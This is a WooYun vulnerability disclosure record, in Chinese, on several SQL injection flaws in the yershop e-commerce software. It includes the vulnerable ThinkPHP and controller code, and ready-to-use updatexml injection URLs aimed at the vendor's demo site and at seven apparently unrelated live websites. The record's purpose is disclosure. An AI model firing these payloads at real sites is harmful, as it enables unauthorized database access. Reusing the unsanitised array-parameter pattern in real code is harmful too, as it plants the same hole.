{"id": 69801, "wybug_id": "wooyun-2015-0124483", "wybug_title": "yershop多用户商城最新版多处SQL注入", "wybug_corp": "yershop.com", "wybug_author": "路人甲", "wybug_date": "2015-07-11 16:52", "wybug_open_date": "2015-10-13 21:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-13：\t细节向公众公开  简要描述： rt 详细说明：  先来五个互联网实例\nhttp://m.meigongfuwu.net//index.php?c=Article&a=index&category[0]==1%20or%20updatexml(1,concat(1,(select%20concat(user(),1,version()))),1)%23in&category[1]=xxxx\n\nhttp://www.xinyuanzn.com/index.php?c=Article&a=index&category[0]==1%20or%20updatexml(1,concat(1,(select%20concat(user(),1,version()))),1)%23in&category[1]=xxxx\n\nhttp://crm.onedodo.net/index.php?c=Article&a=index&category[0]==1 or updatexml(1,concat(1,user()),1)%23in&category[1]=xxxx\n\nhttp://uyshi.com/index.php?c=Article&a=index&category[0]==1 or updatexml(1,concat(1,(select concat(user(),1,version()))),1)#in&category[1]=xxxx\n\nhttp://hiyatou.com/index.php?c=Article&a=index&category[0]==1 or updatexml(1,concat(1,(select concat(user(),1,version()))),1)#in&category[1]=xxxx\n\nhttp://test.nylsfw.com/index.php?c=Article&a=index&category[0]==1 or updatexml(1,concat(1,(select concat(user(),1,version()))),1)#in&category[1]=xxxx\n\nhttp://letai.club/index.php?c=Article&a=index&category[0]==1 or updatexml(1,concat(1,(select concat(user(),1,version()))),1)#in&category[1]=xxxx\n看到数据库操作函数\nprotected function parseWhereItem($key,$val) {        $whereStr = '';        if(is_array($val)) {            if(is_string($val[0])) {                if(preg_match('/^(EQ|NEQ|GT|EGT|LT|ELT)$/i',$val[0])) { // 比较运算                    $whereStr .= $key.' '.$this->comparison[strtolower($val[0])].' '.$this->parseValue($val[1]);                }elseif(preg_match('/^(NOTLIKE|LIKE)$/i',$val[0])){// 模糊查找                    if(is_array($val[1])) {                        $likeLogic  =   isset($val[2])?strtoupper($val[2]):'OR';                        if(in_array($likeLogic,array('AND','OR','XOR'))){                            $likeStr    =   $this->comparison[strtolower($val[0])];                            $like       =   array();                            foreach ($val[1] as $item){                                $like[] = $key.' '.$likeStr.' '.$this->parseValue($item);                            }                            $whereStr .= '('.implode(' '.$likeLogic.' ',$like).')';                                                  }                    }else{                        $whereStr .= $key.' '.$this->comparison[strtolower($val[0])].' '.$this->parseValue($val[1]);                    }                }elseif('bind'==strtolower($val[0])){ // 使用表达式                    $whereStr .= $key.' = :'.$val[1];                }elseif('exp'==strtolower($val[0])){ // 使用表达式                    $whereStr .= $key.' '.$val[1];                }elseif(preg_match('/IN/i',$val[0])){ // IN 运算                    if(isset($val[2]) && 'exp'==$val[2]) {                        $whereStr .= $key.' '.strtoupper($val[0]).' '.$val[1];                    }else{                        if(is_string($val[1])) {                             $val[1] =  explode(',',$val[1]);                        }                        $zone      =   implode(',',$this->parseValue($val[1]));                        $whereStr .= $key.' '.strtoupper($val[0]).' ('.$zone.')';                    }                }elseif(preg_match('/BETWEEN/i',$val[0])){ // BETWEEN运算                    $data = is_string($val[1])? explode(',',$val[1]):$val[1];                    $whereStr .=  $key.' '.strtoupper($val[0]).' '.$this->parseValue($data[0]).' AND '.$this->parseValue($data[1]);                }else{                    E(L('_EXPRESS_ERROR_').':'.$val[0]);                }            }else {                $count = count($val);                $rule  = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : '' ;                 if(in_array($rule,array('AND','OR','XOR'))) {                    $count  = $count -1;                }else{                    $rule   = 'AND';                }                for($i=0;$i<$count;$i++) {                    $data = is_array($val[$i])?$val[$i][1]:$val[$i];                    if('exp'==strtolower($val[$i][0])) {                        $whereStr .= $key.' '.$data.' '.$rule.' ';                    }else{                        $whereStr .= $this->parseWhereItem($key,$val[$i]).' '.$rule.' ';                    }                }                $whereStr = '( '.substr($whereStr,0,-4).' )';            }        }else {            //对字符串类型字段采用模糊匹配            $likeFields   =   $this->config['db_like_fields'];            if($likeFields && preg_match('/^('.$likeFields.')$/i',$key)) {                $whereStr .= $key.' LIKE '.$this->parseValue('%'.$val.'%');            }else {                $whereStr .= $key.' = '.$this->parseValue($val);            }        }        return $whereStr;    }\n如果我们传入的val中val[0]里面含有in或者between的话，后面就可以插入任意的sql语句注入#1看到代码E:/wamp/www/yershop/ThinkPHP/Library/Think/Db/Driver.class.php\npublic function index(){\t\t$cateid= $id ? $id : I('get.category', 0);//获取分类的英文名称\t\t$category = D('Category')->info($cateid);\t\t$id=$category['id'];\t\t\t\t$cid = D('Category')->getChildrenId($id);\t\t$map['category_id']=array(\"in\",$cid);\t\t$map['status']=1;       //推荐商品\t\t$pos=M('Document')->where(\"position!=0\")->select();\t\t$this->assign(\"poslist\",$pos);\t\t $key=I('get.order');\t\t $sort=I('get.sort');         if(isset($key)){\t\t  \t\tif($key==\"1\"){   $listsort=\"view\".\" \".$sort;}  \t\tif($key==\"2\"){ $listsort=\"id\".\" \".$sort;} \t\tif($key==\"3\"){  $listsort=\"price\".\" \".$sort;} \t\tif($key==\"4\"){  $listsort=\"sale\".\" \".$sort;}  \t\t\t   } \tif(empty($key)){$key=\"1\";$see=\"asc\";\t\t\t$order=\"view\";$sort=\"asc\";\t\t    $listsort=$order.\" \".$sort;\t\t\t\t\t\t}\t\t    if($sort==\"asc\"){$see=\"desc\";}      if($sort==\"desc\"){$see=\"asc\";}       $this->assign('see',$see);      $this->assign('order',$key);\t  $this->assign('value',$sort);\t\t$count=M('Document')->where($map)->count();\t\t$Page= new \\Think\\Page($count,15);\t\t$Page->setConfig('prev','上一页');\t\t$Page->setConfig('next','下一页');\t\t$Page->setConfig('first','第一页');\t\t$Page->setConfig('last','尾页');\t\t$Page->setConfig('theme','%FIRST% %UP_PAGE% %LINK_PAGE% %DOWN_PAGE% %END% %HEADER%');\t\t$show= $Page->show();\t\t$list= M('Document')->where($map)->order( $listsort)->limit($Page->firstRow.','.$Page->listRows)->select();\t\t$this->assign('list',$list);// 赋值数据集\t\t$this->assign('page',$show);//\t\t//获取分类的id\t\t$name=$category['name'];\t\t$child=M('Category')->where(\"pid='$id'\")->select();\t\t$this->assign('num', $count);\t\t$this->assign('childlist', $child);\t\t/* 左侧菜单 */\t\t$menu=R('index/menulist');\t\t$this->assign('categoryq', $menu);\t\t/**\t\t* 购物车调用\t\t*/\t\t$cart=R(\"shopcart/usercart\");\t\t$this->assign('usercart',$cart);\t\tif(!session('user_auth')){$usercart=$_SESSION['cart'];\t\t$this->assign('usercart',$usercart);\t\t}\t\t/*栏目页统计代码实现，tag=2*/\t\tif(1==C('IP_TONGJI')){\t\t$record=IpLookup(\"\",2,$name);\t\t}\t\t/* 底部分类调用*/\t\t$menulist=R('Service/AllMenu');\t\t$this->assign('footermenu',$menulist);\t\t/* 热词调用*/\t\t$hotsearch=R(\"Index/getHotsearch\");\t\t$this->assign('hotsearch',$hotsearch);\t\t/* 分类信息 */\t\t$category = $this->category();\t\t//频道页循环3级分类\t\t$this->meta_title = $category['title'];\t\t/*销量排行*/\t\t$sales=$this->ranks();\t\t$this->assign('sales', $sales);\t\t/*最近访问*/\t\t$recent=$this->view_recent();\t\t$this->assign('recent', $recent);\t\t/* 模板赋值并渲染模板 */\t\t$this->assign('category', $category);\t\t$this->display($category['template_index']);\t\t}\n其中category通过I函数获取，然后进入sql里面。我们可以构造\nindex.php?c=Article&a=index&category[0]==1 or updatexml(1,concat(1,(select concat(user(),1,version()))),1)%23in&category[1]=xxxx\n可以成功出信息demo测试\n\n注入#2Application/Home/Controller/TuanController.class.php\npublic function category() {    \t /* 热词调用*/    $hotsearch=R(\"Index/getHotsearch\");    $this->assign('hotsearch',$hotsearch);    /* 购物车调用*/   $cart=R(\"Shopcart/usercart\");   $this->assign('usercart',$cart);   if(!session('user_auth')){$usercart=$_SESSION['cart'];        $this->assign('usercart',$usercart);      }      /* 底部分类调用*/   $menulist=R('Service/AllMenu');   $this->assign('footermenu',$menulist);     /* 左侧分类列表*/     $mlist=R('Index/menulist');     $this->assign('categoryq', $mlist);\t  /** * 控制器必须！**/              \t\t    $tuan=M(\"tuan\");            $category=$tuan->order(\"id\")->select();//团购分类            $this->assign('category',$category);// 赋值数据集\t\t\t /* 获取商品*/\t $pid= $id ? $id : I('get.id', 0);\t $t=$tuan->find($pid);//团购分类\t //获取分类的英文名称       $this->meta_title = '团购_'.$t['title'];     \t $key=I('get.order');\t\t $sort=I('get.sort');         if(isset($key)){\t\t  \t\tif($key==\"1\"){   $listsort=\"view\".\" \".$sort;}  \t\tif($key==\"2\"){ $listsort=\"goodid\".\" \".$sort;} \t\tif($key==\"3\"){  $listsort=\"price\".\" \".$sort;} \t\tif($key==\"4\"){  $listsort=\"salenumber\".\" \".$sort;}  \t\t\t   } \tif(empty($key)){$key=\"1\";$see=\"asc\";\t\t\t$order=\"view\";$sort=\"asc\";\t\t    $listsort=$order.\" \".$sort;\t\t\t\t\t\t}\t\t    if($sort==\"asc\"){$see=\"desc\";}      if($sort==\"desc\"){$see=\"asc\";}       $this->assign('see',$see);      $this->assign('order',$key);\t  $this->assign('value',$sort);\t\t     \t  $tuan=M(\"tuan\");      $category=$tuan->order(\"id\")->select();//团购分类      $this->assign('category',$category);// 赋值数据集\t\t\t /* 获取商品*/\t $User =M(\"tuanid\");    $map['tuanpid']=I('get.id');;   $this->assign('id',$pid);// 赋值数据集\t $User =M(\"tuanid\");       $count=  $User->where($map)->count();      $Page= new \\Think\\Page($count,12);\t   $Page->setConfig('prev','上一页');      $Page->setConfig('next','下一页');      $Page->setConfig('first','第一页');      $Page->setConfig('last','尾页');      $Page->setConfig('theme','%FIRST% %UP_PAGE% %LINK_PAGE% %DOWN_PAGE% %END% %HEADER%');      $show= $Page->show();          $list=$User->where($map)->order($listsort)->limit($Page->firstRow.','.$Page->listRows)->select();     $this->assign('list',$list);// 赋值数据集$this->assign('page',$show);// 赋值分页输出 $this->display();$this->display();\n其中id参数可以注入构造\nhttp://demo.yershop.com/index.php?c=Tuan&a=category&id[0]==1 or updatexml(1,concat(1,(select concat(user(),1,version()))),1)%23in&id[1]=xxx\ndemo测试\n\n注入#3Application/Home/Controller/CenterController.class.php\n/***站内信读取***/public  function msg() {\t\t\t\tif(!is_login()){\t$this->error( \"您还没有登陆\",U(\"User/login\") );\t\t\t}\t\t/* 购物车调用*/\t\t$cart=R(\"shopcart/usercart\");\t\t$this->assign('usercart',$cart);\t\tif(!session('user_auth'))\t\t{\t\t$usercart=$_SESSION['cart'];\t\t$this->assign('usercart',$usercart);\t\t}\t\t/* 底部分类调用*/\t\t$menulist=R('Service/AllMenu');\t\t$this->assign('footermenu',$menulist);\t\t/* 热词调用*/\t\t$hotsearch=R(\"Index/getHotsearch\");\t\t$this->assign('hotsearch',$hotsearch);\t\t$menu=R('index/menulist');\t\t$this->assign('categoryq', $menu);\t\t$envelope= M(\"personenvelope\");\t\t$uid=D(\"member\")->uid();\t\t$id=I(\"get.id\");\t\t/* 更新浏览数 */\t\t$map = array('id' => $id);\t\t$envelope->where($map)->setInc('view');\t\t$list=$envelope->find($id);\t\t$envelope->where($map)->setField(\"status\",2);\t\t$this->assign(\"list\",$list);\t\t$this->meta_title = '查看站内信';\t\t$this->display();\t\t}\nid通过I函数获取可以注入构造\nhttp://demo.yershop.com/index.php?c=Center&a=msg&id[0]==1 or updatexml(1,concat(1,(select concat(user(),1,version()))),1)%23in&id[1]=xxx\ndemo测试\n\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-15 21:25 厂商回复： 谢谢 最新状态： 2015-10-08：已修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}